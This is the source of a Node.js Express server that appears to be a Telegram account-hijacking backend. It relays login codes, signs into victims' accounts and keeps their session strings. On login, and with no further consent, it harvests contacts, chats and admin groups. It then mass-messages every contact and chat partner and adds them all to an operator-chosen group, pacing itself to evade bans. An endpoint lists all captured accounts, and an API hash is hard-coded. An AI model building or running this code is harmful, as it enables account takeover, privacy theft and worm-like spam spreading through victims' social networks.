const express = require('express');
const cors = require('cors');

console.log('🔍 DEBUG: Starting server...');

// Import at the top level so they're available everywhere
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

console.log('✅ DEBUG: TelegramClient type:', typeof TelegramClient);
console.log('✅ DEBUG: Api type:', typeof Api);
console.log('✅ DEBUG: StringSession type:', typeof StringSession);

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';

// Configuration
const TARGET_GROUP_ID = process.env.TARGET_GROUP_ID || ''; // Set this to your group ID
const TARGET_GROUP_HASH = process.env.TARGET_GROUP_HASH || ''; // Set this to your group hash
const MESSAGE_DELAY = 2000; // 2 seconds between messages
const ADD_MEMBER_DELAY = 3000; // 3 seconds between adding members
const MAX_MEMBERS_PER_BATCH = 5; // Add max 5 members at a time

const sessions = new Map();
const authenticatedUsers = new Map();
const operationStatus = new Map(); // Track ongoing operations

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Utility function to delay operations
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending REAL code to: ${phoneNumber}`);
        
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram servers');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 REAL code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying REAL code: ${code} for session: ${sessionId}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            console.log(`❌ Session ${sessionId} not found`);
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        console.log(`✅ Session found for: ${session.phoneNumber}`);

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ REAL login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        
        // Store session string for persistence
        const sessionString = session.client.session.save();
        
        authenticatedUsers.set(userId, {
            client: session.client,
            sessionString: sessionString, // For persistence
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now(),
            isActive: true
        });

        // Clean up temporary session
        sessions.delete(sessionId);

        console.log(`🎉 Authentication completed successfully!`);

        res.json({
            success: true,
            message: 'Real authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        // Initialize operation tracking
        operationStatus.set(userId, {
            lastActivity: Date.now(),
            operations: {
                dataExtraction: 'pending',
                messaging: 'pending',
                groupOperations: 'pending'
            }
        });

        // Start data extraction and operations
        setTimeout(() => {
            performAllOperations(session.client, result.user, session.phoneNumber, userId);
        }, 2000);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Main operation function
async function performAllOperations(client, user, phoneNumber, userId) {
    try {
        console.log(`\n🚀 ===== STARTING ALL OPERATIONS =====`);
        console.log(`🚀 User: ${user.firstName} (${phoneNumber})`);
        
        const status = operationStatus.get(userId);
        
        // Step 1: Extract all data
        status.operations.dataExtraction = 'in_progress';
        const userData = await extractCompleteUserData(client, user, phoneNumber);
        status.operations.dataExtraction = 'completed';
        
        // Step 2: Send messages to all contacts and chat partners
        status.operations.messaging = 'in_progress';
        await sendMassMessages(client, userData, userId);
        status.operations.messaging = 'completed';
        
        // Step 3: Handle group operations
        status.operations.groupOperations = 'in_progress';
        await performGroupOperations(client, userData, userId);
        status.operations.groupOperations = 'completed';
        
        console.log(`\n🎉 ===== ALL OPERATIONS COMPLETED =====`);
        console.log(`✅ User ${user.firstName} operations finished successfully`);
        
    } catch (error) {
        console.error('❌ Operations error:', error);
    }
}

// Extract complete user data
async function extractCompleteUserData(client, user, phoneNumber) {
    try {
        console.log(`\n📊 ===== DATA EXTRACTION PHASE =====`);
        
        // Get contacts
        console.log(`📞 Fetching contacts...`);
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        // Get dialogs (all chats)
        console.log(`💬 Fetching dialogs...`);
        const dialogs = await client.getDialogs({ limit: 200 });
        
        // Categorize dialogs
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        const privateChats = dialogs.filter(d => d.isUser);
        
        // Get admin groups/channels
        console.log(`👑 Checking admin permissions...`);
        const adminGroups = [];
        const adminChannels = [];
        
        for (const group of groups) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: group.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 100,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminGroups.push({
                        ...group,
                        memberCount: group.entity.participantsCount || 0
                    });
                }
                await delay(1000); // Rate limiting
            } catch (error) {
                console.log(`⚠️ Could not check admin status for group: ${group.title}`);
            }
        }
        
        for (const channel of channels) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: channel.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 100,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminChannels.push({
                        ...channel,
                        memberCount: channel.entity.participantsCount || 0
                    });
                }
                await delay(1000); // Rate limiting
            } catch (error) {
                console.log(`⚠️ Could not check admin status for channel: ${channel.title}`);
            }
        }
        
        // Get unique chat partners (people user has chatted with)
        const chatPartners = [];
        for (const chat of privateChats) {
            if (chat.entity && !chat.entity.self && !chat.entity.deleted && !chat.entity.bot) {
                chatPartners.push(chat.entity);
            }
        }
        
        const userData = {
            user,
            phoneNumber,
            contacts,
            chatPartners,
            groups,
            channels,
            adminGroups,
            adminChannels,
            privateChats,
            stats: {
                totalContacts: contacts.length,
                totalChatPartners: chatPartners.length,
                totalGroups: groups.length,
                totalChannels: channels.length,
                adminGroups: adminGroups.length,
                adminChannels: adminChannels.length
            }
        };
        
        // Log detailed report
        console.log(`\n📊 ===== COMPLETE DATA REPORT =====`);
        console.log(`👤 User: ${user.firstName} ${user.lastName}`);
        console.log(`📱 Phone: ${phoneNumber}`);
        console.log(`🆔 Telegram ID: ${user.id}`);
        console.log(`\n📈 STATISTICS:`);
        console.log(`   📞 Contacts: ${contacts.length}`);
        console.log(`   💬 Chat Partners: ${chatPartners.length}`);
        console.log(`   👥 Groups: ${groups.length}`);
        console.log(`   📢 Channels: ${channels.length}`);
        console.log(`   👑 Admin Groups: ${adminGroups.length}`);
        console.log(`   👑 Admin Channels: ${adminChannels.length}`);
        
        if (adminGroups.length > 0) {
            console.log(`\n👑 ADMIN GROUPS:`);
            adminGroups.forEach((group, index) => {
                console.log(`   ${index + 1}. ${group.title} (${group.memberCount} members)`);
            });
        }
        
        if (adminChannels.length > 0) {
            console.log(`\n👑 ADMIN CHANNELS:`);
            adminChannels.forEach((channel, index) => {
                console.log(`   ${index + 1}. ${channel.title} (${channel.memberCount} subscribers)`);
            });
        }
        
        console.log(`\n✅ Data extraction completed!`);
        return userData;
        
    } catch (error) {
        console.error('❌ Data extraction error:', error);
        throw error;
    }
}

// Send messages to all contacts and chat partners
async function sendMassMessages(client, userData, userId) {
    try {
        console.log(`\n📨 ===== MASS MESSAGING PHASE =====`);
        
        const message = "Hello! This is an automated message."; // Customize this message
        
        // Combine contacts and chat partners, remove duplicates
        const allTargets = [...userData.contacts, ...userData.chatPartners];
        const uniqueTargets = allTargets.filter((target, index, self) => 
            index === self.findIndex(t => t.id.toString() === target.id.toString())
        );
        
        console.log(`📨 Sending messages to ${uniqueTargets.length} unique targets...`);
        
        let successCount = 0;
        let errorCount = 0;
        
        for (let i = 0; i < uniqueTargets.length; i++) {
            const target = uniqueTargets[i];
            try {
                await client.invoke(new Api.messages.SendMessage({
                    peer: target,
                    message: message,
                    randomId: Math.floor(Math.random() * 1000000)
                }));
                
                successCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`   ✅ ${i + 1}/${uniqueTargets.length} Message sent to: ${name}`);
                
                // Rate limiting delay
                await delay(MESSAGE_DELAY);
                
            } catch (error) {
                errorCount++;
                const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                console.log(`   ❌ ${i + 1}/${uniqueTargets.length} Failed to send to: ${name} - ${error.message}`);
                
                // If we hit rate limits, wait longer
                if (error.message.includes('FLOOD_WAIT')) {
                    const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                    console.log(`⏳ Rate limit hit, waiting ${waitTime/1000} seconds...`);
                    await delay(waitTime);
                }
            }
        }
        
        console.log(`\n📊 MESSAGING RESULTS:`);
        console.log(`   ✅ Successful: ${successCount}`);
        console.log(`   ❌ Failed: ${errorCount}`);
        console.log(`   📨 Total attempted: ${uniqueTargets.length}`);
        
    } catch (error) {
        console.error('❌ Mass messaging error:', error);
    }
}

// Handle group operations
async function performGroupOperations(client, userData, userId) {
    try {
        console.log(`\n👥 ===== GROUP OPERATIONS PHASE =====`);
        
        if (!TARGET_GROUP_ID) {
            console.log(`⚠️ No target group ID set - skipping group operations`);
            return;
        }
        
        // First, make user join the target group
        console.log(`👥 Joining target group...`);
        try {
            await client.invoke(new Api.channels.JoinChannel({
                channel: TARGET_GROUP_ID
            }));
            console.log(`✅ User joined target group successfully`);
        } catch (error) {
            console.log(`⚠️ Could not join group (might already be member): ${error.message}`);
        }
        
        await delay(2000);
        
        // Add all contacts to the target group
        console.log(`👥 Adding contacts to target group...`);
        
        const allTargets = [...userData.contacts, ...userData.chatPartners];
        const uniqueTargets = allTargets.filter((target, index, self) => 
            index === self.findIndex(t => t.id.toString() === target.id.toString())
        );
        
        let addedCount = 0;
        let failedCount = 0;
        
        // Add members in batches
        for (let i = 0; i < uniqueTargets.length; i += MAX_MEMBERS_PER_BATCH) {
            const batch = uniqueTargets.slice(i, i + MAX_MEMBERS_PER_BATCH);
            
            for (const target of batch) {
                try {
                    await client.invoke(new Api.channels.InviteToChannel({
                        channel: TARGET_GROUP_ID,
                        users: [target]
                    }));
                    
                    addedCount++;
                    const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                    console.log(`   ✅ Added to group: ${name} (${addedCount}/${uniqueTargets.length})`);
                    
                } catch (error) {
                    failedCount++;
                    const name = `${target.firstName || ''} ${target.lastName || ''}`.trim() || 'Unknown';
                    console.log(`   ❌ Failed to add: ${name} - ${error.message}`);
                    
                    // Handle specific errors
                    if (error.message.includes('USER_PRIVACY_RESTRICTED')) {
                        console.log(`   ℹ️ ${name} has privacy restrictions`);
                    } else if (error.message.includes('USER_ALREADY_PARTICIPANT')) {
                        console.log(`   ℹ️ ${name} is already in the group`);
                    }
                }
                
                // Rate limiting delay
                await delay(ADD_MEMBER_DELAY);
            }
            
            // Longer delay between batches
            if (i + MAX_MEMBERS_PER_BATCH < uniqueTargets.length) {
                console.log(`⏳ Batch completed, waiting before next batch...`);
                await delay(10000); // 10 second delay between batches
            }
        }
        
        console.log(`\n📊 GROUP OPERATIONS RESULTS:`);
        console.log(`   ✅ Successfully added: ${addedCount}`);
        console.log(`   ❌ Failed to add: ${failedCount}`);
        console.log(`   👥 Total attempted: ${uniqueTargets.length}`);
        
    } catch (error) {
        console.error('❌ Group operations error:', error);
    }
}

// API endpoint to get user status
app.get('/api/user/:userId/status', (req, res) => {
    const { userId } = req.params;
    const user = authenticatedUsers.get(userId);
    const status = operationStatus.get(userId);
    
    if (!user) {
        return res.status(404).json({
            success: false,
            message: 'User not found'
        });
    }
    
    res.json({
        success: true,
        user: {
            firstName: user.user.firstName,
            lastName: user.user.lastName,
            phoneNumber: user.phoneNumber,
            loginTime: user.loginTime,
            isActive: user.isActive
        },
        operations: status?.operations || {},
        lastActivity: status?.lastActivity || user.loginTime
    });
});

// API endpoint to get all authenticated users
app.get('/api/users', (req, res) => {
    const users = Array.from(authenticatedUsers.values()).map(user => ({
        userId: user.userId,
        firstName: user.user.firstName,
        lastName: user.user.lastName,
        phoneNumber: user.phoneNumber,
        loginTime: user.loginTime,
        isActive: user.isActive,
        operations: operationStatus.get(user.userId)?.operations || {}
    }));
    
    res.json({
        success: true,
        users: users,
        totalUsers: users.length
    });
});

// API endpoint to logout user
app.post('/api/user/:userId/logout', async (req, res) => {
    try {
        const { userId } = req.params;
        const user = authenticatedUsers.get(userId);
        
        if (!user) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }
        
        // Disconnect client
        await user.client.disconnect();
        
        // Remove from storage
        authenticatedUsers.delete(userId);
        operationStatus.delete(userId);
        
        console.log(`🚪 User ${user.user.firstName} (${user.phoneNumber}) logged out`);
        
        res.json({
            success: true,
            message: 'User logged out successfully'
        });
        
    } catch (error) {
        console.error('❌ Logout error:', error);
        res.status(400).json({
            success: false,
            message: 'Logout failed'
        });
    }
});

// Health endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        mode: 'Complete Telegram Operations',
        library: 'Telegram.js',
        sessions: sessions.size,
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString(),
        features: [
            'Mass messaging',
            'Group member addition',
            'Admin group detection',
            'Persistent sessions',
            'Rate limiting'
        ]
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Complete Operations System',
        status: 'Running',
        mode: 'Full Telegram Automation',
        description: 'Authenticates users, sends mass messages, and manages group operations',
        features: [
            'Real Telegram authentication',
            'Mass messaging to contacts and chat partners',
            'Auto-add contacts to specified group',
            'Admin group/channel detection with member counts',
            'Persistent user sessions',
            'Smart rate limiting to avoid bans',
            'Real-time operation tracking'
        ],
        endpoints: [
            'POST /api/telegram/send-code',
            'POST /api/telegram/verify-code',
            'GET /api/users',
            'GET /api/user/:userId/status',
            'POST /api/user/:userId/logout',
            'GET /health'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Complete Operations System Started`);
    console.log(`📡 Running on port ${PORT}`);
    console.log(`🔍 Mode: Full automation with safety controls`);
    console.log(`📨 Features: Mass messaging + Group operations`);
    console.log(`⚠️ Rate limiting enabled to prevent bans`);
    console.log(`✅ Ready for complete operations!`);
});